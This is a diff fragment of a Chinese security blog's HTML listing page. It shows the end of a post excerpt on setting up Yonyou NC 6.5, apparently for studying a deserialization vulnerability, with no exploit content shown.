+<p><img src="/resource/%E7%94%A8%E5%8F%8Bnc6.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
+<ul>
+<li>  2.选择安装的产品，这里我只安装了部分与NC相关的模块。下面对NC产品模块做个简要说明;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8Bnc%206.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1u900rky8v19df2d1ki" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/">上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/3/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
